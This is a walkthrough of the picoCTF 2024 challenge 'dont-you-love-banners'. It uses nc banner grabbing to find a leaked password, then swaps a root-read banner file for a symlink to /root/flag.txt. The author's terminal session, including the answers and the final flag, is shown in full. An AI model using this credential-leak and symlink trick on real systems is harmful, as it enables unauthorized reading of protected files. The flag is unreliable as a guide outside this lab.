dont-you-love-banners

Name: dont-you-love-banners
Description: Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 61017. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 50103. From the above information abuse the machine and find the flag in the /root directory.
Author: Loic Shema / syreal
Tags: Medium, General Skills, picoCTF 2024, shell, browser_webshell_solvable
Challenge from: picoCTF 2024
Hints:
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing

Theory

According to the description, to get the flag we have to find it over on the root directory of the second NetCat connection, which we can enter with some critical information that has been leaked over on the first NetCat. We'll first connect to the first one of course, so that we can check out what information leaked to enter into the second one and somehow get the flag from root, so if we don't enter the second NetCat with root permissions then we'll have to find some other way to get the flag from root. So we'll connect to these two over on the solution part.

Solution

We'll connect to the first NetCat from the description to see what this leaked information is:

shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 57392
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C

Well, that's some very informative leaked information, we get what program is running the other NetCat, but also its password:

shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 62316
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls

Some simple questions after the password, we get inside the shell! Let's check out what files are in here and see if we can access the flag:

player@challenge:~$ ls
banner  text

player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************

player@challenge:~$ cat text	
keep digging

player@challenge:~$ find / -name "flag.txt" 2>/dev/null
/root/flag.txt

player@challenge:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied

Okay, I see something very interesting here. If we look at the banner, it's the same one that is printed when we enter into this second NetCat, and the challenge title has banner in it, so what if we could somehow copy the flag into the filename of the banner, so that the next time we enter the NetCat, the flag is printed in the place of that banner? Well, there is something that we can try, symbolic links, which let you assign a link to another file, so for example, if we put a link from the flag to the banner, when it requests the contents of banner it'll instead get redirected to the flag file. So let's see if we can do this with our permissions, what we need to do first is delete the banner, then assign the flag to that same filename:

player@challenge:~$ rm banner

player@challenge:~$ ls
text

player@challenge:~$ ln -s /root/flag.txt banner

player@challenge:~$ ls
banner  text

Perfect! We were able to replace the banner with a link to the flag, let's reconnect to see if it actually worked:

player@challenge:~$ exit
logout
What is the top cyber security conference in the world?
^C
shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 62316
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

what is the password?

There we go! That's the flag.
